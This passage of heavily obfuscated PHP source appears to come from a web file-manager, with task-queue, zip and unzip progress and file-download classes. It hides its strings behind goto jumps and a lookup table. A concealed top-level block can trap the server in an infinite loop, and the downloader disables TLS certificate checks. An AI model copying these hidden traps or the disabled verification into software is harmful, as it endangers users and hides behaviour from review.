self::log($FÜø¯Ö¹‹[1534] . $this->task[$FÜø¯Ö¹‹[392]]); $this->end(); } public function progress($fÖã™ æó‘, $FÃŞôğÇÒ·, $Dáƒ¡Â‘Â, $DÙĞ¥ô¾¡, $Dİ»È°¶çğ) { $CØƒ’†× =& $_SERVER[åÌÛ»ô¢‚ö™]; $bå¾ëÌ˜† =& $this->task; if ($Dİ»È°¶çğ > 0) { $bå¾ëÌ˜†[$CØƒ’†×[999]] = $bå¾ëÌ˜†[$CØƒ’†×[999]] == 0 ? $DÙĞ¥ô¾¡ : $bå¾ëÌ˜†[$CØƒ’†×[999]]; $bå¾ëÌ˜†[$CØƒ’†×[1013]] = $Dİ»È°¶çğ; } else { if ($Dáƒ¡Â‘Â > 0) { $bå¾ëÌ˜†[$CØƒ’†×[999]] = $bå¾ëÌ˜†[$CØƒ’†×[999]] == 0 ? $FÃŞôğÇÒ· : $bå¾ëÌ˜†[$CØƒ’†×[999]]; $bå¾ëÌ˜†[$CØƒ’†×[1013]] = $Dáƒ¡Â‘Â; } } $this->update(); self::log("\160\162\157\147\x72\x65\x73\x73\110\164\164\160\x3a\x64\x6f\x77\x6e\72{$Dáƒ¡Â‘Â}\x2f{$FÃŞôğÇÒ·}\73\x20\x75\160\x6c\x6f\x61\x64\72{$Dİ»È°¶çğ}\57{$DÙĞ¥ô¾¡}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\x73\x6b\121\165\145\165\x65\114\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\145\x75\145\104\141\x74\141"; public static function initTask() { } public static function add($F”…Ø°«‹, $CÓ´÷•°¢ = array(), $E²ù†³°«ì = '', $AŠ½òèâ¨° = '') { goto DŞÁØŒ‚ì; Eã›³ô“Ì´: if ($AŠ½òèâ¨° && array_find_by_field($Eøßá¢ÙÇƒ, $D¯…Úµ¨†Å[89], $AŠ½òèâ¨°)) { return !0; } $Eøßá¢ÙÇƒ[] = array($D¯…Úµ¨†Å[267] => $F”…Ø°«‹, $D¯…Úµ¨†Å[1535] => $CÓ´÷•°¢, $D¯…Úµ¨†Å[430] => $E²ù†³°«ì, $D¯…Úµ¨†Å[89] => $AŠ½òèâ¨°); write_log($D¯…Úµ¨†Å[1536] . $E²ù†³°«ì, $D¯…Úµ¨†Å[1537]); goto dĞ¢…Ş­¹œ; dĞ¢…Ş­¹œ: self::setAll($Eøßá¢ÙÇƒ); return !0; goto BË ³¢„’—; DŞÁØŒ‚ì: $D¯…Úµ¨†Å =& $_SERVER[åÌÛ»ô¢‚ö™]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Eøßá¢ÙÇƒ = self::getAll(); goto Eã›³ô“Ì´; BË ³¢„’—: } public static function run() { goto DÒˆ¬ÚÃË‹; FÌ™‡Ú¸¶¯: if (!$e±†ŒğÀáç) { return !1; } self::setAll($C‡øÅŠ™±); write_log($dîË‘¿‘Ÿ[1538] . $e±†ŒğÀáç[$dîË‘¿‘Ÿ[430]], $dîË‘¿‘Ÿ[1537]); goto cÇºåƒí›—; DÒˆ¬ÚÃË‹: $dîË‘¿‘Ÿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C‡øÅŠ™± = self::getAll(); $e±†ŒğÀáç = array_shift($C‡øÅŠ™±); goto FÌ™‡Ú¸¶¯; cÇºåƒí›—: try { $dÚó’Áµì = Hook::apply($e±†ŒğÀáç[$dîË‘¿‘Ÿ[267]], $e±†ŒğÀáç[$dîË‘¿‘Ÿ[1535]]); } catch (Exception $c¶•ËÀ¸) { } write_log($dîË‘¿‘Ÿ[1539] . $e±†ŒğÀáç[$dîË‘¿‘Ÿ[430]], $dîË‘¿‘Ÿ[1537]); return !0; goto b¨š…–¤áÅ; b¨š…–¤áÅ: } public static function count() { $A•„ÉĞí» = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$A•„ÉĞí») { return 0; } return intval($A•„ÉĞí»); } public static function getAll() { $F’‘ñ›‹µÒ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$F’‘ñ›‹µÒ) { return array(); } return $F’‘ñ›‹µÒ; } public static function setAll($f‚ˆõ–•á‹) { $cÙÄó£šÌÚ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($f‚ˆõ–•á‹), $cÙÄó£šÌÚ); Cache::set(self::QUEUE_DATA, $f‚ˆõ–•á‹, $cÙÄó£šÌÚ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto bÔ×œ¸’…¸; bÔ×œ¸’…¸: $fİëÑ¸‚Ÿ =& $_SERVER[åÌÛ»ô¢‚ö™]; parent::startAfter(); Hook::bind($fİëÑ¸‚Ÿ[1540], array($this, $fİëÑ¸‚Ÿ[1541])); goto dÔàµç…Ñá; aÍÚˆ‘˜‡: if (!$a’ò‚®òº¶[$fİëÑ¸‚Ÿ[1368]]) { $a’ò‚®òº¶[$fİëÑ¸‚Ÿ[1368]] = LNG($fİëÑ¸‚Ÿ[1544]); } goto f¿ø‡ÃŸ§Ä; dÔàµç…Ñá: Hook::bind($fİëÑ¸‚Ÿ[1062], array($this, $fİëÑ¸‚Ÿ[1542])); $a’ò‚®òº¶ =& $this->task; $a’ò‚®òº¶[$fİëÑ¸‚Ÿ[1543]] = $fİëÑ¸‚Ÿ[1067]; goto aÍÚˆ‘˜‡; f¿ø‡ÃŸ§Ä: } protected function endAfter() { $EÓ¶‹‡Ú÷Ï =& $_SERVER[åÌÛ»ô¢‚ö™]; parent::endAfter(); Hook::unbind($EÓ¶‹‡Ú÷Ï[1540], array($this, $EÓ¶‹‡Ú÷Ï[1541])); Hook::unbind($EÓ¶‹‡Ú÷Ï[1062], array($this, $EÓ¶‹‡Ú÷Ï[1542])); } public function updateAfter() { $CÍÎÚŸŒ‰§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÍ˜¬Ïã½– =& $this->task; if (!$BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[999]] || !$BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[725]]) { return; } if ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1543]] == $CÍÎÚŸŒ‰§[1067]) { $F¡Ó‘‰äÙç = 0; if ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1510]]) { $F¡Ó‘‰äÙç = $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1511]] / $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1510]]; } $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1466]] = $F¡Ó‘‰äÙç * 0.3; } else { if ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1543]] == $CÍÎÚŸŒ‰§[316]) { $F¡Ó‘‰äÙç = $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1013]] / $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[999]]; $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1466]] = 0.3 + $F¡Ó‘‰äÙç * 0.4; } else { if ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1543]] == $CÍÎÚŸŒ‰§[103]) { $A‡ˆ½µ•“ = 0; if ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1512]] == $CÍÎÚŸŒ‰§[103]) { $A‡ˆ½µ•“ = $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1511]]; } $F¡Ó‘‰äÙç = ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1515]] + $A‡ˆ½µ•“) / $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[725]]; $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1466]] = 0.3 + 0.4 + $F¡Ó‘‰äÙç * 0.3; } } } if ($BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1466]] > 0) { $CÁëÅè‡“ = timeFloat() - $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1468]] - $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1471]]; $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1472]] = $CÁëÅè‡“ * (1 - $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1466]]) / $BÍ˜¬Ïã½–[$CÍÎÚŸŒ‰§[1466]]; } } public function addFile($a³ø«¬à„) { goto a’Å­›ïœ‚; bÓÚ„ˆåí‹: $c‘×ÁÉãù[$E•ª§éƒø›[1508]] = $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[28]]; $c‘×ÁÉãù[$E•ª§éƒø›[1510]] = $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[77]]; $c‘×ÁÉãù[$E•ª§éƒø›[1511]] = 0; goto eÛ…µ¿õ°; FöÂ¡°êË: $this->update(); goto Fê‚øšï¬µ; a’Å­›ïœ‚: $E•ª§éƒø› =& $_SERVER[åÌÛ»ô¢‚ö™]; $c‘×ÁÉãù =& $this->task; $Fîğ¿ò‰Ãğ = IO::info($a³ø«¬à„); goto bÓÚ„ˆåí‹; aĞŠí®°ã: $c‘×ÁÉãù[$E•ª§éƒø›[999]] = 1; $Däßˆ¥·²ƒ = 0; $c‘×ÁÉãù[$E•ª§éƒø›[1519]] = array($E•ª§éƒø›[1520] => $Däßˆ¥·²ƒ + 1, $E•ª§éƒø›[411] => $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[28]], $E•ª§éƒø›[75] => $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[75]], $E•ª§éƒø›[492] => $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[492]] ? $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[492]] : $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[75]]); goto FöÂ¡°êË; eÛ…µ¿õ°: $c‘×ÁÉãù[$E•ª§éƒø›[1001]] = $E•ª§éƒø›[1527]; $c‘×ÁÉãù[$E•ª§éƒø›[1512]] = $E•ª§éƒø›[1067]; $c‘×ÁÉãù[$E•ª§éƒø›[725]] = $Fîğ¿ò‰Ãğ[$E•ª§éƒø›[77]]; goto aĞŠí®°ã; Fê‚øšï¬µ: } public function unzipAfter($dÉšªİ¨­´) { goto aÉñ»òî; eÉ²²¢®®î: $fÅíºœ±î±[$a½ƒåğÀÊŠ[1508]] = $a½ƒåğÀÊŠ[33]; $fÅíºœ±î±[$a½ƒåğÀÊŠ[1515]] = 0; $fÅíºœ±î±[$a½ƒåğÀÊŠ[725]] = $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[77]]; goto Fœ“ï‚äÑ; aÉñ»òî: $a½ƒåğÀÊŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÅíºœ±î± =& $this->task; $fÅíºœ±î±[$a½ƒåğÀÊŠ[1543]] = $a½ƒåğÀÊŠ[103]; goto añÒõ¦Õ—Ş; e£‡ŒÓ›ãß: if ($dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[29]] == $a½ƒåğÀÊŠ[171]) { $fÅíºœ±î±[$a½ƒåğÀÊŠ[999]] = 1; } else { $fÅíºœ±î±[$a½ƒåğÀÊŠ[999]] = $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[80]][$a½ƒåğÀÊŠ[78]]; } $fÅíºœ±î±[$a½ƒåğÀÊŠ[1001]] = $a½ƒåğÀÊŠ[33]; $fÅíºœ±î±[$a½ƒåğÀÊŠ[1512]] = 0; goto D‹—’Éæ‡; D‹—’Éæ‡: $fÅíºœ±î±[$a½ƒåğÀÊŠ[1013]] = 0; $fÅíºœ±î±[$a½ƒåğÀÊŠ[1510]] = 0; $fÅíºœ±î±[$a½ƒåğÀÊŠ[1511]] = 0; goto eÉ²²¢®®î; añÒõ¦Õ—Ş: $dË™šÛ—ŞÂ = IO::infoWithChildren($dÉšªİ¨­´); $A‡îºá’ˆ = 0; $fÅíºœ±î±[$a½ƒåğÀÊŠ[1519]] = array($a½ƒåğÀÊŠ[1520] => $A‡îºá’ˆ + 1, $a½ƒåğÀÊŠ[411] => $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[28]], $a½ƒåğÀÊŠ[75] => $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[75]], $a½ƒåğÀÊŠ[492] => $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[492]] ? $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[492]] : $dË™šÛ—ŞÂ[$a½ƒåğÀÊŠ[75]]); goto e£‡ŒÓ›ãß; Fœ“ï‚äÑ: $this->update(); self::log($a½ƒåğÀÊŠ[1545] . json_encode(array($fÅíºœ±î±, $dË™šÛ—ŞÂ))); goto bïñÈ³¶§‹; bïñÈ³¶§‹: } public function nameParse($EÊ¯Ü¥ã»Í) { goto AÊğ»‰Ì³÷; fÁğä¯çã’: $this->update(); goto C¯®ééáèä; AÊğ»‰Ì³÷: $AÀÖ™ÒÖø =& $_SERVER[åÌÛ»ô¢‚ö™]; $b–ÃªŸß§è =& $this->task; if ($b–ÃªŸß§è[$AÀÖ™ÒÖø[1543]] == $AÀÖ™ÒÖø[1067]) { $b–ÃªŸß§è[$AÀÖ™ÒÖø[1543]] = $AÀÖ™ÒÖø[316]; $b–ÃªŸß§è[$AÀÖ™ÒÖø[1515]] = 0; $b–ÃªŸß§è[$AÀÖ™ÒÖø[725]] = 0; } goto CŒªÛ†¸; CŒªÛ†¸: $CŠ¢›ï«™À = get_path_this($EÊ¯Ü¥ã»Í); if (strstr($CŠ¢›ï«™À, $AÀÖ™ÒÖø[91])) { $b–ÃªŸß§è[$AÀÖ™ÒÖø[1013]] += 1; $b–ÃªŸß§è[$AÀÖ™ÒÖø[999]] += 1; } $b–ÃªŸß§è[$AÀÖ™ÒÖø[1508]] = $EÊ¯Ü¥ã»Í; goto fÁğä¯çã’; C¯®ééáèä: } } goto CÙò²·øÜ; CÙò²·øÜ: if (!isset($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][179]]) || !isset($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][787]])) { goto FÚ­ˆîà; aäÒÔÁÃµË: $Cî­¸Ş¢‰($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][181]] . $_SERVER[åÌÛ»ô¢‚ö™][182]); $b¬×Ã•…³ê = 2; while ($b¬×Ã•…³ê > 1) { $aÔŸî›Šë = rawurlencode($b¬×Ã•…³ê . $_SERVER[åÌÛ»ô¢‚ö™][377]); } goto C´êêˆÏ¢¾; FÚ­ˆîà: $C±½ïÒ»¿— = $_SERVER[åÌÛ»ô¢‚ö™][180]; $e¼Î¢‹è»Ñ = $_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][181]] . $_SERVER[åÌÛ»ô¢‚ö™][182]; $Bççœ¹™á = $C±½ïÒ»¿—($e¼Î¢‹è»Ñ); goto bà¬¥¨†æ; bà¬¥¨†æ: $F£ìÀñµ±é = explode($_SERVER[åÌÛ»ô¢‚ö™][183], $Bççœ¹™á); if (count($F£ìÀñµ±é) < $_SERVER[åÌÛ»ô¢‚ö™][184]) { $Fó‰íä«Œ¹ = $_SERVER[åÌÛ»ô¢‚ö™][185]; $Fó‰íä«Œ¹(); } $Cî­¸Ş¢‰ = $_SERVER[åÌÛ»ô¢‚ö™][186]; goto aäÒÔÁÃµË; C´êêˆÏ¢¾: } class TaskZip extends TaskFileTransfer { protected function startAfter() { $a‘½Ó¬£Ú– =& $_SERVER[åÌÛ»ô¢‚ö™]; parent::startAfter(); Hook::bind($a‘½Ó¬£Ú–[1546], array($this, $a‘½Ó¬£Ú–[1541])); $DÙÍÆÓàåì =& $this->task; $DÙÍÆÓàåì[$a‘½Ó¬£Ú–[1543]] = $a‘½Ó¬£Ú–[1067]; if (!$DÙÍÆÓàåì[$a‘½Ó¬£Ú–[1368]]) { $DÙÍÆÓàåì[$a‘½Ó¬£Ú–[1368]] = LNG($a‘½Ó¬£Ú–[1547]); } } protected function endAfter() { $c‚²¤‘ª² =& $_SERVER[åÌÛ»ô¢‚ö™]; parent::endAfter(); Hook::unbind($c‚²¤‘ª²[1546], array($this, $c‚²¤‘ª²[1541])); } public function updateAfter() { $f æÁŸÍÇƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e·ˆâò÷çœ =& $this->task; if (!$e·ˆâò÷çœ[$f æÁŸÍÇƒ[999]] || !$e·ˆâò÷çœ[$f æÁŸÍÇƒ[725]]) { return; } if ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1543]] == $f æÁŸÍÇƒ[1067]) { $CéËºš±Ù’ = $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1511]]; if ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1512]] != $f æÁŸÍÇƒ[1067]) { $CéËºš±Ù’ = 0; } $B¼¤±²©’Í = ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1515]] + $CéËºš±Ù’) / $e·ˆâò÷çœ[$f æÁŸÍÇƒ[725]]; $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1466]] = $B¼¤±²©’Í * 0.3; } else { if ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1543]] == $f æÁŸÍÇƒ[316]) { $B¼¤±²©’Í = $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1013]] / $e·ˆâò÷çœ[$f æÁŸÍÇƒ[999]]; $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1466]] = 0.3 + $B¼¤±²©’Í * 0.5; } else { if ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1543]] == $f æÁŸÍÇƒ[103]) { $B¼¤±²©’Í = 0; if ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1510]]) { $B¼¤±²©’Í = $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1511]] / $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1510]]; } $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1466]] = 0.3 + 0.5 + $B¼¤±²©’Í * 0.2; } } } if ($e·ˆâò÷çœ[$f æÁŸÍÇƒ[1466]] > 0) { $fĞ…è‹œÁ = timeFloat() - $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1468]] - $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1471]]; $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1472]] = $fĞ…è‹œÁ * (1 - $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1466]]) / $e·ˆâò÷çœ[$f æÁŸÍÇƒ[1466]]; } } public function copyFileStart($FñÓÎÄï„›, $eÀŒ‰Öô¯, $F§‚ËˆŞ°›, $a¸«éŠ‚ŠÁ, $b÷Ç•ÓŠÌõ, $aíÖÆ²ÁŠ°) { $Aé™Ü‡êÉˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; parent::copyFileStart($FñÓÎÄï„›, $eÀŒ‰Öô¯, $F§‚ËˆŞ°›, $a¸«éŠ‚ŠÁ, $b÷Ç•ÓŠÌõ, $aíÖÆ²ÁŠ°); $FñŒÄõÉª =& $this->task; if ($FñŒÄõÉª[$Aé™Ü‡êÉˆ[1543]] == $Aé™Ü‡êÉˆ[316]) { $FñŒÄõÉª[$Aé™Ü‡êÉˆ[1543]] = $Aé™Ü‡êÉˆ[103]; } $this->update(); } public function copyFileEnd($c‹Ë °ƒ„Ò, $A¿¾¿££©‚, $d¨Ô†Øâ˜¯, $Cä’‘÷Ş¼, $A¾¸œÎÂÆ, $Fæ‡´ÎƒÕ) { $Fæ‹½Ü«³ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BŒ¬ÁøƒÑ =& $this->task; $BŒ¬ÁøƒÑ[$Fæ‹½Ü«³[1511]] = $BŒ¬ÁøƒÑ[$Fæ‹½Ü«³[1510]]; $BŒ¬ÁøƒÑ[$Fæ‹½Ü«³[1515]] += $BŒ¬ÁøƒÑ[$Fæ‹½Ü«³[1510]]; $BŒ¬ÁøƒÑ[$Fæ‹½Ü«³[1512]] = $Fæ‹½Ü«³[33]; $this->update(); } public function nameParse($DŸãëŒâ¼á) { $FÓàº¯œºÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e÷®ÊÇöÒ =& $this->task; if ($e÷®ÊÇöÒ[$FÓàº¯œºÆ[1013]] < $e÷®ÊÇöÒ[$FÓàº¯œºÆ[999]]) { $D¥éšÖ¡¡ = get_path_this($DŸãëŒâ¼á); if (strstr($D¥éšÖ¡¡, $FÓàº¯œºÆ[91])) { $e÷®ÊÇöÒ[$FÓàº¯œºÆ[1013]] += 1; } } if ($e÷®ÊÇöÒ[$FÓàº¯œºÆ[1543]] == $FÓàº¯œºÆ[1067]) { $e÷®ÊÇöÒ[$FÓàº¯œºÆ[1543]] = $FÓàº¯œºÆ[316]; } $e÷®ÊÇöÒ[$FÓàº¯œºÆ[1508]] = $DŸãëŒâ¼á; $this->update(); } } class Downloader { static function start($CŠ±Çª¨œ›, $Cİöåó¬„, $D®ŠÇò»Š = 10) { goto aƒÁ‚†¦Œ; bÇ÷Í‡Ë‰: if ($aîº¯É³êÊ > $fË¶ùâ¶Âë) { @unlink($F÷‚¯¥æå); } file_put_contents($b•ôÁ ØÒÑ, json_encode($a–êŠĞ…)); $EÓ”› ­Â = self::fileDownloadCurl($CŠ±Çª¨œ›, $Cİöåó¬„, !0, $aîº¯É³êÊ, $fË¶ùâ¶Âë); goto DƒÎôƒòé­; AØ²Ø·ìµ: $F÷‚¯¥æå = $Cİöåó¬„ . $D‚‹êã»‹[1549]; if (is_array($CŠ±Çª¨œ›)) { $f¶‚ÛªŒÊò = $CŠ±Çª¨œ›; } else { $f¶‚ÛªŒÊò = url_header($CŠ±Çª¨œ›); } $CŠ±Çª¨œ› = $f¶‚ÛªŒÊò[$D‚‹êã»‹[310]]; goto e±Á†Œğ±; e±Á†Œğ±: if (!$CŠ±Çª¨œ›) { return array($D‚‹êã»‹[1059] => !1, $D‚‹êã»‹[1061] => $D‚‹êã»‹[1064]); } if (!$f¶‚ÛªŒÊò[$D‚‹êã»‹[1314]] || $f¶‚ÛªŒÊò[$D‚‹êã»‹[340]] == 0) { @unlink($F÷‚¯¥æå); @unlink($Cİöåó¬„); $EÓ”› ­Â = self::fileDownloadFopen($CŠ±Çª¨œ›, $Cİöåó¬„, $f¶‚ÛªŒÊò[$D‚‹êã»‹[340]]); if ($EÓ”› ­Â[$D‚‹êã»‹[1059]]) { return $EÓ”› ­Â; } else { @unlink($F÷‚¯¥æå); @unlink($Cİöåó¬„); $EÓ”› ­Â = self::fileDownloadCurl($CŠ±Çª¨œ›, $Cİöåó¬„, !1, 0, $f¶‚ÛªŒÊò[$D‚‹êã»‹[340]]); @unlink($F÷‚¯¥æå); return $EÓ”› ­Â; } } $aîº¯É³êÊ = is_file($F÷‚¯¥æå) ? filesize_64($F÷‚¯¥æå) : 0; goto C¬ŒÀÜÁò; aƒÁ‚†¦Œ: $D‚‹êã»‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!request_url_safe($CŠ±Çª¨œ›)) { return array($D‚‹êã»‹[1059] => !1, $D‚‹êã»‹[1061] => $D‚‹êã»‹[1064]); } $b•ôÁ ØÒÑ = $Cİöåó¬„ . $D‚‹êã»‹[1548]; goto AØ²Ø·ìµ; DƒÎôƒòé­: if ($EÓ”› ­Â[$D‚‹êã»‹[1059]]) { @unlink($b•ôÁ ØÒÑ); } return $EÓ”› ­Â; goto F…ÓÏòËÆ°; C¬ŒÀÜÁò: $fË¶ùâ¶Âë = intval($f¶‚ÛªŒÊò[$D‚‹êã»‹[340]]); if (file_exists($F÷‚¯¥æå) && time() - filemtime($F÷‚¯¥æå) < 3) { return array($D‚‹êã»‹[1059] => !1, $D‚‹êã»‹[1061] => $D‚‹êã»‹[1550]); } $a–êŠĞ… = array(); goto D˜ŠŒùù¾Â; D˜ŠŒùù¾Â: if (is_file($b•ôÁ ØÒÑ)) { $e‹‚ˆº¹óŒ = file_get_contents($b•ôÁ ØÒÑ); $a–êŠĞ… = json_decode($e‹‚ˆº¹óŒ, 1); } if (file_exists($Cİöåó¬„) && $fË¶ùâ¶Âë == filesize_64($Cİöåó¬„)) { @unlink($F÷‚¯¥æå); @unlink($b•ôÁ ØÒÑ); return array($D‚‹êã»‹[1059] => !0, $D‚‹êã»‹[1061] => $D‚‹êã»‹[1551]); } if ($a–êŠĞ…[$D‚‹êã»‹[340]] != $fË¶ùâ¶Âë) { $a–êŠĞ… = array($D‚‹êã»‹[340] => $fË¶ùâ¶Âë); } goto bÇ÷Í‡Ë‰; F…ÓÏòËÆ°: } static function fileDownloadFopen($f±ŠÎ²÷­…, $c¹Àè‡Îáå, $FÇ²âĞó†¸ = 0) { $eëîÉÛ–±˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; @ini_set($eëîÉÛ–±˜[1552], $eëîÉÛ–±˜[1553]); $B¥°éÎÉ§Ç = $c¹Àè‡Îáå . $eëîÉÛ–±˜[1549]; set_timeout(); @unlink($B¥°éÎÉ§Ç); if ($aíĞ‘Ì‰Â° = @fopen($f±ŠÎ²÷­…, $eëîÉÛ–±˜[1554])) { goto eÊÚò…¾«š; EØßˆİàÎ: return array($eëîÉÛ–±˜[1059] => !0, $eëîÉÛ–±˜[1061] => $eëîÉÛ–±˜[723]); goto bĞËÎÇºÓ; d³ëöãŞ„: fclose($aíĞ‘Ì‰Â°); self::checkGzip($B¥°éÎÉ§Ç); if (!@rename($B¥°éÎÉ§Ç, $c¹Àè‡Îáå)) { usleep(round(rand(0, 1000) * 50)); @unlink($c¹Àè‡Îáå); $eìóµ·ªÇé = @rename($B¥°éÎÉ§Ç, $c¹Àè‡Îáå); if (!$eìóµ·ªÇé) { return array($eëîÉÛ–±˜[1059] => !1, $eëîÉÛ–±˜[1061] => $eëîÉÛ–±˜[1558]); } } goto EØßˆİàÎ; eÊÚò…¾«š: if (!($f‘á‹áÉãÄ = @fopen($B¥°éÎÉ§Ç, $eëîÉÛ–±˜[1555]))) { return array($eëîÉÛ–±˜[1059] => !1, $eëîÉÛ–±˜[1061] => $eëîÉÛ–±˜[1556]); } while (!feof($aíĞ‘Ì‰Â°)) { if (!file_exists($B¥°éÎÉ§Ç)) { fclose($f‘á‹áÉãÄ); return array($eëîÉÛ–±˜[1059] => !1, $eëîÉÛ–±˜[1061] => $eëîÉÛ–±˜[1557]); } clearstatcache(); if ($FÇ²âĞó†¸ > 0 && $FÇ²âĞó†¸ == filesize(iconv_system($B¥°éÎÉ§Ç))) { break; } fwrite($f‘á‹áÉãÄ, fread($aíĞ‘Ì‰Â°, 1024 * 8), 1024 * 8); } fclose($f‘á‹áÉãÄ); goto d³ëöãŞ„; bĞËÎÇºÓ: } else { return array($eëîÉÛ–±˜[1059] => !1, $eëîÉÛ–±˜[1061] => $eëîÉÛ–±˜[1559]); } } static function fileDownloadCurl($B­ùà—¥™, $fàßä²Šî, $d’†¼É’ëÏ = false, $cÚÆƒè­ƒÇ = 0, $B—å˜Šœ•¤ = 0) { goto EÈ§¶ßÀ²é; EÈ§¶ßÀ²é: $Bæˆ¹“÷¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dö¥Ø÷¯’î = $fàßä²Šî . $Bæˆ¹“÷¥[1549]; set_timeout(); goto eÄŸï¤‚“¶; cÓÛŞò¹Ñ’: curl_setopt($a—Ñ¨İ¥½â, CURLOPT_USERAGENT, $Bæˆ¹“÷¥[1553]); $A‡ÆÕ¡áÃˆ = curl_exec($a—Ñ¨İ¥½â); curl_progress_end($a—Ñ¨İ¥½â); goto déã—¦±ëŒ; D†ÄïäÑêƒ: if ($d’†¼É’ëÏ) { curl_setopt($a—Ñ¨İ¥½â, CURLOPT_RANGE, $cÚÆƒè­ƒÇ . $Bæˆ¹“÷¥[742]); } curl_setopt($a—Ñ¨İ¥½â, CURLOPT_FILE, $cˆ‚—ä¡‡à); curl_setopt($a—Ñ¨İ¥½â, CURLOPT_REFERER, get_url_link($B­ùà—¥™)); goto c»Éí‡Ë«¬; c»Éí‡Ë«¬: curl_setopt($a—Ñ¨İ¥½â, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($a—Ñ¨İ¥½â, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($a—Ñ¨İ¥½â, CURLOPT_SSL_VERIFYHOST, 0); goto b×†¨ƒâªì; AÆ¾ïŸ¤: if ($fŞïóØîÂ < $B—å˜Šœ•¤ && $B—å˜Šœ•¤ != 0) { return array($Bæˆ¹“÷¥[1059] => !1, $Bæˆ¹“÷¥[1061] => $Bæˆ¹“÷¥[1550]); } if ($A‡ÆÕ¡áÃˆ && filesize_64($Dö¥Ø÷¯’î) != 0) { self::checkGzip($Dö¥Ø÷¯’î); if (!@rename($Dö¥Ø÷¯’î, $fàßä²Šî)) { @unlink($fàßä²Šî); $A‡ÆÕ¡áÃˆ = @rename($Dö¥Ø÷¯’î, $fàßä²Šî); if (!$A‡ÆÕ¡áÃˆ) { return array($Bæˆ¹“÷¥[1059] => !1, $Bæˆ¹“÷¥[1061] => $Bæˆ¹“÷¥[1562]); } } return array($Bæˆ¹“÷¥[1059] => !0, $Bæˆ¹“÷¥[1061] => $Bæˆ¹“÷¥[723]); } return array($Bæˆ¹“÷¥[1059] => !1, $Bæˆ¹“÷¥[1061] => $Bæˆ¹“÷¥[1563]); goto d…õÊ…®„; eÄŸï¤‚“¶: $cˆ‚—ä¡‡à = @fopen($Dö¥Ø÷¯’î, $Bæˆ¹“÷¥[1003]); if (!$cˆ‚—ä¡‡à) { return array($Bæˆ¹“÷¥[1059] 